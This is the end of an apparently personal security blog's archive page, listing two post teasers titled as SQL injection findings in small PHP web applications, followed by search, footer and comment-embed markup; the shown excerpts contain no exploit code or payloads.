      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          less than 1 minute read
        
      </span>
        
  </p>
  


    <p class="archive__item-excerpt" itemprop="description">Information about vulnerability
- Exploit Title: Online Veterinary Appointment System 1.0 - 'Multiple' SQL Injection
- Date: 05/01/20222
- Exploit Author: tw...</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src="/assets/images/teaser.png" alt="">
      </div>
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/exploit-db/hprmsv1.0-sql-injection/" rel="permalink">Hospitals Patient Records Management System 1.0 - ‘id’ SQL Injection (Authenticated)
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        <time datetime="2021-12-30T00:00:00+07:00">December 30, 2021</time>
      </span>
    
    
    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          less than 1 minute read
        
      </span>
        
  </p>
  


    <p class="archive__item-excerpt" itemprop="description">Information about vulnerability
- Exploit Title: Hospital's Patient Records Management System v1.0 - 'id' SQL Injection (Authenticated)
- Date: 2021-12-30
- ...</p>
  </article>
</div>

        
      </div>
    </div>
  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    <!-- <li><b>Support My Works: </b><a href="https://www.buymeacoffee.com/twseptian"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&emoji=&slug=twseptian&button_colour=0ecd34&font_colour=000000&font_family=Lato&outline_colour=000000&coffee_colour=FFDD00" width="150",height="150"></a></li> -->
    
      <li><strong>Follow:</strong></li>
    
    
      
        
      
          <li><a href="https://www.buymeacoffee.com/twseptian" rel="nofollow noopener noreferrer"><i class="fas fa-mug-hot" aria-hidden="true"></i> Buy Me a Coffee</a>
          </li>
        
      
    
    
    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>

</div>
<div class="page__footer-copyright">&copy; 2024 my notes, journey and stuff | Powered by <a href="https://jekyllrb.com/">Jekyll</a> & <a href="https://mmistakes.github.io/minimal-mistakes/about/">Minimal Mistakes</a> | Build with ❤.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>




    
  <script>
    var disqus_config = function () {
      this.page.url = "http://localhost:4000/cyberseclabs/cyberseclabs-shares/";  /* Replace PAGE_URL with your page's canonical URL variable */
      this.page.identifier = "/cyberseclabs/cyberseclabs-shares"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
    };
    (function() { /* DON'T EDIT BELOW THIS LINE */
      var d = document, s = d.createElement('script');
      s.src = 'https://https-twseptian-github-io.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  </script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>


  





  </body>
</html>
